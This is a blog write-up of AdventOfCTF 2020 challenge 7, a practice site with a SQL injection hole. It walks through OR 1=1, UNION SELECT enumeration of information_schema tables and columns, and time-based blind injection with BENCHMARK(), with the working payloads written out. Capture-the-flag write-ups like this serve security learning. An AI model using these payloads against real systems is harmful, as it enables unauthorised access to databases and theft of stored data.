+++
author = "Maik de Kruif"
title = "Challenge 7"
subtitle = "Challenge 7 - AdventOfCTF"
date = 2020-12-07T16:43:23+01:00
description = "A writeup for challenge 7 of AdventOfCTF."
cover = "img/writeups/adventofctf/2020/9fac6046540f4972c60f458b94aacb1d.png"
tags = [
    "AdventOfCTF",
    "challenge",
    "ctf",
    "hacking",
    "writeup",
    "web",
    "sql-injection",
]
categories = [
    "ctf",
    "writeups",
    "hacking",
]
+++

- Points: 700

## Description

Santa has a naughty list, I wonder who is on it? I hope it is not the blind mice!

Visit <https://07.adventofctf.com> to start the challenge.

## Finding the vulnerability

When opening the challenge website, we, yet again, see a search bar. Could this be another SQL Injection challenge? Let's try `'`. No result, bet the column name is also gone, so it probably do some SQL injection.

### SQL Injection

This time, no error message is shown. But the output is! (I'll get back to that later 😀.) First of all, let's get an idea of what the query to the database might be. I could be this:

```sql
SELECT why FROM naughty WHERE why LIKE '%search text%';
```

If this were the query, we can easily try to just get all records. To do this, we need to modify the `WHERE` statement to always be true. A way to do this is to add a `OR 1=1 -- ` to the query as `1` is always equal to `1`. But how do we do that? Well, is the backend doesn't properly create a query, we can escape the string inside the `WHERE` query and add our own code. An example input would be `' OR 1=1 -- `. If this would be inserted inside the query we would get this:

```sql
SELECT why FROM naughty WHERE why LIKE '%' OR 1=1 -- %';
```

If we input this (`' OR 1=1 -- `) in the search field, we get the flag! It is `NOVI{bl1nd_sql1_is_naughty}`

This flag can then be submitted for the [challenge](https://ctfd.adventofctf.com/challenges#7-8).

## Part 2

This, however, wasn't the solution the creator ([@credmp](https://twitter.com/credmp)) had intended. So he added another challenge. The description was this:

> Challenge 7 had a very unintended easy solution. This was my mistake and it did not surface during playtesting. In order to make it worth your while to solve the challenge in the intended way, please enter the username of the user on the naughty list to receive some additional (possibly very important) points

We can, however, solve this challenge in an unintended way as well 😀.

### Table name

Let's have a look at our guessed query again:

```sql
SELECT why FROM naughty WHERE why LIKE '%search text%';
```

This time, we probably want to get some other columns from the database. To do this, we have to know the table name first. A query to get all tables from a MySQL database is the following:

```sql
SELECT table_name FROM information_schema.tables --
```

If we adjust this query to be injectable in the original query, we get this:

```text
' UNION SELECT table_name FROM information_schema.tables --
```

Which, inside the query would look like the following:

```sql
SELECT why FROM naughty WHERE why LIKE '%' UNION SELECT table_name FROM information_schema.tables -- %';
```

Here we use a `UNION SELECT` to add rows from another table in to the results. The result of this input contains lots of rows, but if we strip the default ones, we get are left with one row:

| Who?    |
| ------- |
| naughty |

### Column names

Now that we know the table name, we can then get the columns from it with this query:

```sql
SELECT column_name FROM information_schema.columns WHERE table_name = "naughty"
```

If we convert this to an input, we get `' UNION SELECT column_name FROM information_schema.columns WHERE table_name = "naughty" -- `. This return the following rows:

| Who?     |
| -------- |
| id       |
| username |
| badthing |

### Table content

Knowing the table and column names, we can get all rows in the table. This output of the original query, however, only has one row. Because of this, we have to concatenate the results of the different columns together. A query for this would be:

```sql
SELECT CONCAT(id, " | ", username, " | ", badthing) FROM naughty
```

Converted to an input we get `' UNION SELECT CONCAT(id, " | ", username, " | ", badthing) FROM naughty -- `, which, after submitting it, gives us one row:

| Who?                                        |
| ------------------------------------------- |
| 1 \| egische \| NOVI{bl1nd_sql1_is_naughty} |

As the username is the second column, it is "egische".

This flag can then be submitted [here](<https://ctfd.adventofctf.com/challenges#Challenge%207%20(additional)-26>).

## The actual intended solution

The intended way to solve this challenge was to use blind SQL injection. Which means you do not get a visual response. You might think "How is that possible without a result?". It's actually pretty easy but it takes some time. A way to do it is to make queries take a long time if the query returns a row, but not wait if the result has zero rows.

### Database name

For instance, let's say the query in the backend is the following:

```sql
SELECT why FROM naughty WHERE other_column = 'search text';
```

To get the database name, we could write a query that takes some time if a sub-query returns a result and doesn't if it doesn't. An example of such a query would be the following:

```sql
SELECT CASE WHEN (SELECT DATABASE() LIKE "a%") THEN BENCHMARK(9000000,MD5(1)) ELSE 1 END
```

This would run `BENCHMARK(9000000,MD5(1))` if the sub-query returns more than 1 row. The `BENCHMARK()` is used because it's a function that takes a while to run.

This query will have to be converted to an input first. This will become `' UNION SELECT CASE WHEN (SELECT DATABASE() LIKE "a%") THEN BENCHMARK(9000000,MD5(1)) ELSE 1 END -- `

If we replace `a` with another letter we can find out the database name like this:

```text
a
b
...
t
ta
...
te
tea
...
tes
...
testdb
```

This will, of course, take some time.

### Other tables

To get the tables inside the database, the same method will have to be used. An example query for this would be the following:

```sql
SELECT CASE WHEN COUNT((SELECT table_name FROM information_schema.tables WHERE table_name LIKE "a%" AND table_schema = "testdb" LIMIT 1))>0 THEN BENCHMARK(9000000,MD5(1)) ELSE 1 END
```

Which will convert to `' UNION SELECT CASE WHEN COUNT((SELECT table_name FROM information_schema.tables WHERE table_name LIKE "a%" AND table_schema = "testdb" LIMIT 1))>0 THEN BENCHMARK(9000000,MD5(1)) ELSE 1 END -- `

By using this method, we can get the all database records but it will take a long time.
